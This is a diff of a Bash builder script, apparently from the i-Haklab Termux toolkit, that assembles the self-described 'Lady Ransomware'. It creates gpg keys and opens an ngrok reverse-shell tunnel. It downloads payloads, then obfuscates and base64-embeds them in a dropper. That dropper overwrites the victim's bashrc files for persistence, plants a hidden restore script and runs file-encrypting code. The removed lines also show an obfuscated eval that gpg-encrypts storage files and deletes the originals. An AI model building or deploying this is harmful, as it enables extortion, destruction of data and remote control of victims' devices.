@@ -11,61 +11,79 @@ trap ctrl_c 2
 source $PREFIX/share/i-Haklab/.set/var/variables
 source $iHAKLAB/.set/functions/functions
 ctrl_c(){ printf "\n$Y\n   (¿) Need a help (?)$B\nTelegram : t.me/Ivam3_Bot$W\n";exit;}
-email=$(gpg -k|grep "ultimate"|awk -F " " '{print $4}')
-
 printf "$M ____                                      __  __\n|  _ \ __ _ _ __  ____ ___  _ __ ___  _   _\ \/ /\n| |_) / _\` | '_ \/ __|/ _ \| '_ \` _ \| | | |\  /\n|  _ < (_| | | | \__ \ (_) | | | | | | |_| |/  \\ \n|_| \_\__,_|_| |_|___/\___/|_| |_| |_|\__,_/_/\_\\ \n#::::::::::::by::Lady::Ransomware::::::::::::::::#$W\n"
 
 #:::SETTINGS:::#
 [[ -d ~/.gnupg ]] && rm -rf ~/.gnupg
-printf "$G(_>)─➤$W Installing dependencies."
+printf "$G(_>)─➤$W Installing dependencies.\n"
 yes apt update && yes|apt upgrade && yes|apt install gnupg coreutils nmap-ncat nodejs && npm install -g bash-obfuscate
 [[ -e $PREFIX/etc/apt/sources.list.d/abhacker.repo.list ]] && yes|apt install ngrok-server || bash $iHAKLAB/.set/fix-tools/instAbhackerRepo --install ngrok-server
-printf "$G(_>)─➤$W Let's to create encrypt and decrypt keys$Y\n ╰────➤$W remember, passphrase is the key to delete de ramsonware";sleep 2;gpg --generate-key
+
+printf "$G(_>)─➤$W Let's to create encrypt and decrypt keys$Y\n ╰────➤$W remember, passphrase is the key to delete de ramsonware\n";sleep 2;gpg --generate-key
+uid=$(gpg -k|grep "ultimate"|awk -F " " '{print $3}')
+email=$(gpg -k|grep "ultimate"|awk -F " " '{print $4}')
+gpg --armor --output ~/.gnupg/public-key.gpg --export $email
+key=$(cat ~/.gnupg/public-key.gpg)
+
 printf "$G(_>)─➤$W Setting reverse shell."
 exec ngrok -tcp 4546 >/dev/null 2>/dev/null &
 revHOST=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f1)
 revPORT=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f2)
 [[ -z $revHOST ]] && { printf >&2 "$R\n(_>)─➤ ERROR :$W ngrok tunnel failed\n";ctrl_c;}
+
 wget -q $iHDB/share/lady -O $iHAKLAB/.set/share/lady
+wget -q $iHDB/share/ransomware -O $iHAKLAB/.set/share/ransomware
 chmod 777 $iHAKLAB/.set/share/lady
+chmod 777 $iHAKLAB/.set/share/ransomware
 sed 's|eval|echo|g' -i $iHAKLAB/.set/share/lady
-bash $iHAKLAB/.set/share/lady > $TMPDIR/lady
+bash $iHAKLAB/.set/share/lady > $TMPDIR/lady.deo
 rm -f $iHAKLAB/.set/share/lady
-sed "s|HERETUNNEL|'$revHOST'|g" -i $TMPDIR/lady
-sed "s|HEREPORT|'$revPORT'|g" -i $TMPDIR/lady
-sed "s|EMILIO|$email'|g" -i $TMPDIR/lady
-bash-obfuscate $TMPDIR/lady -o $iHAKLAB/.set/share/lady
-rm -f $TMPDIR/lady
+sed "s|HERETUNNEL|'$revHOST'|g" -i $TMPDIR/lady.deo
+sed "s|HEREPORT|'$revPORT'|g" -i $TMPDIR/lady.deo
+sed "s|EMILIO|$email'|g" -i $TMPDIR/lady.deo
+bash-obfuscate $TMPDIR/lady.deo -o $iHAKLAB/.set/share/lady
+printf "#!/usr/bin/bash\nsource $PREFIX/libexec/termux/.restore" > $TMPDIR/bashrc.deo
+bash-obfuscate $TMPDIR/bashrc.deo -o $TMPDIR/bashrc
+sed 's|eval|echo|g' -i $iHAKLAB/.set/share/ransomware
+bash $iHAKLAB/.set/share/ransomware > $TMPDIR/ransomware.deo
+sed "s|HACKERITA|$uid|g" -i $TMPDIR/ransomware.deo
+rm -f $iHAKLAB/.set/share/ransomware
+bash-obfuscate $TMPDIR/ransomware.deo -o $iHAKLAB/.set/share/ransomware
+bashrc64=$(base64 $TMPDIR/bashrc)
+unransom64=$(base64 $iHAKLAB/.set/share/unransomware)
+lady64=$(base64 $iHAKLAB/.set/share/lady)
+ransom64=$(base64 $iHAKLAB/.set/share/ransomware)
+rm -rf $TMPDIR/*
 
 #:::RANSOMWARE:::#
-cat <<- CONF > $iHAKLAB/.set/share/ladyransomware
+cat <<- CONF > $iHAKLAB/.set/share/ladyransomware.deo
 #!/usr/bin/bash
-yes|apt install gnupg >/dev/null 2>&1
+command -v gpg >/dev/null || yes|apt install gnupg >/dev/null 2>&1
+command -v base64 >/dev/null || yes|apt install coreutils >/dev/null 2>&1
+echo "$key" > $TMPDIR/key.$uid
+gpg --import $TMPDIR/key.$uid > /dev/null 2>/dev/null;rm $TMPDIR/key.$uid
 cat $PREFIX/etc/bash.bashrc > $PREFIX/etc/bashito
-cat <<- CONF > $PREFIX/etc/bash.bashrc
-$(cat $iHAKLAB/.set/share/lady)
-\CONF
-printf "z=\"\n\";Ez='a/co';Jz='sr/l';Gz='rmux';Cz='data';Bz='ce /';Mz='ermu';Az='sour';Nz='x/.r';Fz='m.te';Oz='eloa';Hz='/fil';Pz='d';Kz='ibex';Iz='es/u';Lz='ec/t';Dz='/dat';\neval \"\$Az\$Bz\$Cz\$Dz\$Ez\$Fz\$Gz\$Hz\$Iz\$Jz\$Kz\$Lz\$Mz\$Nz\$Oz\$Pz\"" > ~/.bashrc;
-cat <<- CONF > $PREFIX/libexec/termux/.reload
-$(cat $iHAKLAB/.set/share/ransomware)
-\CONF
-chmod +x $PREFIX/libexec/termux/.reload
-
-printf "z=\"\n\";sz='\"\${i';LBz='\$i.l';OBz='adyr';GBz='w \$i';Bz='"/st';SBz='.lad';HBz='&& g';Pz='prin';Dz='e/em';Fz='ed/0';ez='type';DBz='hmod';Mz='wk -';xz='ull';QBz='mwar';Kz='l -n';Az='SD0=';jz='i in';UBz=' && ';wz='ev/n';hz='D1 -';Ez='ulat';kz=' \${T';BBz=' ]] ';gz='T2=$';nz='T2[*';IBz='pg -';KBz=' -o ';pz='o';Wz='d"|h';RBz='e \$i';yz='[[ -';Gz='"';Oz='" '\''{';EBz=' +rw';qz='mv "';PBz='anso';Vz='late';bz='(fin';FBz='x \$i';az='T1=$';Sz='rep ';Jz='|tai';ABz='O \$i';VBz='rm $';Lz=' 2|a';XBz='done';TBz='y ]]';Uz='"emu';tz='// /';Xz='ead ';iz='for ';mz='} \${';dz='D0 -';Tz='-iv ';rz='\$i" ';vz='2>/d';JBz='e -q';WBz='i';Cz='orag';fz=' f)';lz='1[*]';Nz='F \" ';MBz='ady ';Hz='SD1=';uz='-}\" ';Rz='}'\\''|g';oz=']};d';Qz='t \$6';Iz='\$(df';CBz='&& c';cz='d \$S';Yz='-n 1';NBz='-r l';Zz=')';\neval \"\$Az\$Bz\$Cz\$Dz\$Ez\$Fz\$Gz\$z\$Hz\$Iz\$Jz\$Kz\$Lz\$Mz\$Nz\$Oz\$Pz\$Qz\$Rz\$Sz\$Tz\$Uz\$Vz\$Wz\$Xz\$Yz\$Zz\$z\$az\$bz\$cz\$dz\$ez\$fz\$z\$gz\$bz\$cz\$hz\$ez\$fz\$z\$iz\$jz\$kz\$lz\$mz\$nz\$oz\$pz\$z\$qz\$rz\$sz\$tz\$uz\$vz\$wz\$xz\$z\$yz\$ABz\$BBz\$CBz\$DBz\$EBz\$FBz\$z\$yz\$GBz\$BBz\$HBz\$IBz\$JBz\$KBz\$LBz\$MBz\$NBz\$OBz\$PBz\$QBz\$RBz\$z\$yz\$RBz\$SBz\$TBz\$UBz\$VBz\$WBz\$z\$XBz\"" > $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp && chmod +x $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp && bash $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp
+base64 -d >$PREFIX/etc/bash.bashrc<<DIXIE
+$lady64
+DIXIE
+base64 -d >~/.bashrc<<DIXIE
+$bashrc64
+DIXIE
+base64 -d >$PREFIX/libexec/termux/.restore<<DIXIE
+$unransom64
+DIXIE
+chmod 777 $PREFIX/libexec/termux/.restore
+base64 -d >$TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp<<DIXIE
+$ransom64
+DIXIE
+chmod 777 $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp
+source $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp
+rm -r $TMPDIR/1q2w3e4r5t6y7u8i9o0p.tmp
 CONF
+bash-obfuscate $iHAKLAB/.set/share/ladyransomware.deo -O $iHAKLAB/ladyransomware
+rm -f $iHAKLAB/.set/share/ladyransomware.deo
+
 printf "$G(_>)_Script_to_hide_the_ransomware$W"
 while read -p " ╰────➤ " script [ -z $script ] || [ -e $script ];do
 	printf >&2 "$R(_>)─➤$W Not such file\n"
 done
-
-
-
-key1PATH=$(find ~/.gnupg -iname "*.key"|head -n 1)
-key1=$(cat $key1PATH)
-key2PATH=$(find ~/.gnupg -iname "*.key"|tail -n 1)
-key2=$(cat $key2PATH)
-
-
-uid=$(gpg -k|grep "ultimate"|awk -F " " '{print $3}')
-
-
